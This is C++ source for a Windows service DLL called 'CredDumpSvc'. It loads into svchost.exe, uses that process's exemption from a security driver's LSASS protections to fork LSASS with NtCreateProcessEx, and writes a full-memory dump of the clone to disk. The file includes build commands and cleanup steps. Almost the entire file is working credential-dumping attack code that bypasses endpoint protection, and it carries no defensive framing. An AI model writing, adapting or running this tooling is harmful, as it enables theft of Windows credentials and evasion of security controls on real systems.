/*
 * SvcCloneDll.cpp — Svchost Service DLL: Fork LSASS + MiniDumpWriteDump
 *
 * Technique:
 *   1. Runs inside svchost.exe (exempt from LSASS handle protections)
 *   2. OpenProcess(LSASS, PROCESS_CREATE_PROCESS) — granted because svchost
 *      is on the kernel driver's trusted process allowlist
 *   3. NtCreateProcessEx to fork LSASS into a clone with a different PID
 *   4. MiniDumpWriteDump on the clone process
 *   5. Terminate and clean up the clone
 *
 * The svchost.exe exemption gives us the initial handle, and the process
 * fork gives us a full copy of LSASS memory under a non-protected PID.
 *
 * Build (MinGW x64):
 *   x86_64-w64-mingw32-g++ -shared -o SvcCloneDll.dll SvcCloneDll.cpp \
 *       -ldbghelp -ladvapi32 -lntdll -static -static-libgcc -static-libstdc++
 */

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0A00
#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <dbghelp.h>
#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "dbghelp.lib")

/* ===========================================================
 *  Constants
 * =========================================================== */
#define SVC_NAME       L"CredDumpSvc"
#define REG_PARAMS     L"SYSTEM\\CurrentControlSet\\Services\\CredDumpSvc\\Parameters"
#define LOG_BUF        (64 * 1024)

/* ===========================================================
 *  NT typedefs
 * =========================================================== */
typedef NTSTATUS (NTAPI *pfnNtCreateProcessEx)(
    PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes, HANDLE ParentProcess,
    ULONG Flags, HANDLE SectionHandle,
    HANDLE DebugPort, HANDLE ExceptionPort, ULONG JobMemberLevel);

typedef NTSTATUS (NTAPI *pfnNtQueryInformationProcess)(
    HANDLE ProcessHandle, ULONG ProcessInformationClass,
    PVOID ProcessInformation, ULONG ProcessInformationLength,
    PULONG ReturnLength);

typedef NTSTATUS (NTAPI *pfnNtTerminateProcess)(
    HANDLE ProcessHandle, NTSTATUS ExitStatus);

typedef struct _PROCESS_BASIC_INFORMATION2 {
    NTSTATUS  ExitStatus;
    PVOID     PebBaseAddress;
    ULONG_PTR AffinityMask;
    LONG      BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION2;

/* ===========================================================
 *  Globals
 * =========================================================== */
static SERVICE_STATUS        g_Svc;
static SERVICE_STATUS_HANDLE g_SvcH = NULL;
static char g_Log[LOG_BUF];
static int  g_LogP = 0;

/* ===========================================================
 *  Logging
 * =========================================================== */
static void Log(const char *f, ...) {
    va_list a; va_start(a, f);
    int n = vsnprintf(g_Log + g_LogP, LOG_BUF - g_LogP - 2, f, a);
    va_end(a);
    if (n > 0) g_LogP += n;
    if (g_LogP < LOG_BUF - 2) { g_Log[g_LogP++] = '\r'; g_Log[g_LogP++] = '\n'; }
}

static void FlushLog(const wchar_t *dp) {
    if (!g_LogP) return;
    wchar_t lp[MAX_PATH]; wcscpy_s(lp, MAX_PATH, dp);
    wchar_t *d = wcsrchr(lp, L'.');
    if (d) wcscpy_s(d, MAX_PATH - (d - lp), L".log");
    else wcscat_s(lp, MAX_PATH, L".log");
    HANDLE h = CreateFileW(lp, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD w; WriteFile(h, g_Log, g_LogP, &w, NULL); CloseHandle(h);
    }
}

/* ===========================================================
 *  Helpers
 * =========================================================== */
static DWORD FindLsassPid() {
    DWORD pid = 0;
    HANDLE s = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (s == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(s, &pe)) do {
        if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) { pid = pe.th32ProcessID; break; }
    } while (Process32NextW(s, &pe));
    CloseHandle(s);
    return pid;
}

static BOOL GetDumpPath(wchar_t *out, DWORD mx) {
    HKEY hk;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, REG_PARAMS, 0, KEY_READ, &hk) != ERROR_SUCCESS)
        return FALSE;
    DWORD cb = mx * sizeof(wchar_t), t = 0;
    LONG r = RegQueryValueExW(hk, L"DumpPath", NULL, &t, (BYTE*)out, &cb);
    RegCloseKey(hk);
    return (r == ERROR_SUCCESS);
}

/* ===========================================================
 *  Fork LSASS and Dump
 * =========================================================== */
static void DoDump(const wchar_t *dumpPath) {
    Log("[*] ================================================================");
    Log("[*]  SvcCloneDll — Fork LSASS via svchost.exe service");
    Log("[*]  svchost.exe PID %lu", GetCurrentProcessId());
    Log("[*]  Output: %ls", dumpPath);
    Log("[*] ================================================================");

    /* Resolve NT APIs */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) { Log("[-] No ntdll"); return; }

    pfnNtCreateProcessEx pCreate =
        (pfnNtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
    pfnNtQueryInformationProcess pQuery =
        (pfnNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    pfnNtTerminateProcess pTerminate =
        (pfnNtTerminateProcess)GetProcAddress(hNtdll, "NtTerminateProcess");

    if (!pCreate || !pQuery) { Log("[-] Failed to resolve NT APIs"); return; }

    /* Find LSASS */
    DWORD lsassPid = FindLsassPid();
    if (!lsassPid) { Log("[-] LSASS not found"); return; }
    Log("[+] LSASS PID: %lu", lsassPid);

    /* Step 1: Open LSASS with PROCESS_CREATE_PROCESS */
    Log("[*] Step 1: OpenProcess(LSASS, PROCESS_CREATE_PROCESS)");
    HANDLE hLsass = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, lsassPid);
    if (!hLsass) {
        Log("[-] OpenProcess failed: %lu", GetLastError());
        /* Fallback: try PROCESS_ALL_ACCESS (svchost exemption should grant it) */
        hLsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPid);
        if (!hLsass) { Log("[-] Fallback also failed: %lu", GetLastError()); return; }
        Log("[*] Got PROCESS_ALL_ACCESS handle");
    } else {
        Log("[+] LSASS handle: 0x%p (PROCESS_CREATE_PROCESS)", hLsass);
    }

    /* Step 2: Fork LSASS via NtCreateProcessEx */
    Log("[*] Step 2: NtCreateProcessEx — forking LSASS...");
    HANDLE hClone = NULL;
    NTSTATUS status = pCreate(&hClone, PROCESS_ALL_ACCESS, NULL, hLsass,
                              0, NULL, NULL, NULL, 0);
    if (status < 0 || !hClone) {
        Log("[-] NtCreateProcessEx failed: 0x%08X", status);
        if (status == (NTSTATUS)0xC0000022)
            Log("    STATUS_ACCESS_DENIED — handle doesn't have required access");
        CloseHandle(hLsass);
        return;
    }

    /* Get clone PID */
    PROCESS_BASIC_INFORMATION2 pbi = {0};
    ULONG retLen = 0;
    pQuery(hClone, 0, &pbi, sizeof(pbi), &retLen);
    DWORD clonePid = (DWORD)pbi.UniqueProcessId;

    Log("[+] LSASS clone created — Clone PID: %lu, LSASS PID: %lu", clonePid, lsassPid);

    /* Step 3: MiniDumpWriteDump on the clone */
    Log("[*] Step 3: MiniDumpWriteDump on clone (PID %lu)...", clonePid);

    HANDLE hFile = CreateFileW(dumpPath, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        Log("[-] CreateFile failed: %lu", GetLastError());
        if (pTerminate) pTerminate(hClone, 0);
        CloseHandle(hClone);
        CloseHandle(hLsass);
        return;
    }

    BOOL dumped = MiniDumpWriteDump(hClone, clonePid, hFile,
                                    MiniDumpWithFullMemory, NULL, NULL, NULL);
    CloseHandle(hFile);

    if (dumped) {
        HANDLE hChk = CreateFileW(dumpPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                                  OPEN_EXISTING, 0, NULL);
        if (hChk != INVALID_HANDLE_VALUE) {
            LARGE_INTEGER sz; GetFileSizeEx(hChk, &sz); CloseHandle(hChk);
            Log("[+] Dump SUCCESS: %lld bytes (%.1f MB)",
                sz.QuadPart, (double)sz.QuadPart / (1024.0 * 1024.0));
        }
        Log("[+] === LSASS DUMP SUCCESSFUL ===");
    } else {
        Log("[-] MiniDumpWriteDump failed: %lu", GetLastError());
        DeleteFileW(dumpPath);
    }

    /* Step 4: Cleanup — kill the clone */
    Log("[*] Step 4: Terminating clone...");
    if (pTerminate) pTerminate(hClone, 0);
    CloseHandle(hClone);
    CloseHandle(hLsass);
    Log("[+] Clone terminated. Cleanup complete.");
}

/* ===========================================================
 *  Service plumbing
 * =========================================================== */
static void ReportStatus(DWORD st, DWORD ec, DWORD wh) {
    static DWORD chk = 1;
    g_Svc.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    g_Svc.dwCurrentState = st;
    g_Svc.dwWin32ExitCode = ec;
    g_Svc.dwWaitHint = wh;
    g_Svc.dwControlsAccepted = (st == SERVICE_START_PENDING) ? 0 : SERVICE_ACCEPT_STOP;
    g_Svc.dwCheckPoint = (st == SERVICE_RUNNING || st == SERVICE_STOPPED) ? 0 : chk++;
    SetServiceStatus(g_SvcH, &g_Svc);
}

static DWORD WINAPI SvcCtrlHandler(DWORD ctrl, DWORD, LPVOID, LPVOID) {
    if (ctrl == SERVICE_CONTROL_STOP) {
        ReportStatus(SERVICE_STOP_PENDING, 0, 3000);
        ReportStatus(SERVICE_STOPPED, 0, 0);
    }
    return NO_ERROR;
}

extern "C" __declspec(dllexport)
void WINAPI ServiceMain(DWORD argc, LPWSTR *argv) {
    g_SvcH = RegisterServiceCtrlHandlerExW(SVC_NAME, SvcCtrlHandler, NULL);
    if (!g_SvcH) return;
    ReportStatus(SERVICE_START_PENDING, 0, 10000);

    wchar_t dp[MAX_PATH] = {0};
    if (!GetDumpPath(dp, MAX_PATH)) {
        Log("[-] DumpPath not in registry, using fallback");
        wcscpy_s(dp, L"C:\\Windows\\Temp\\lsass_dump.dmp");
    }

    ReportStatus(SERVICE_RUNNING, 0, 0);
    DoDump(dp);
    FlushLog(dp);
    ReportStatus(SERVICE_STOPPED, 0, 0);
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
    if (r == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(h);
    return TRUE;
}
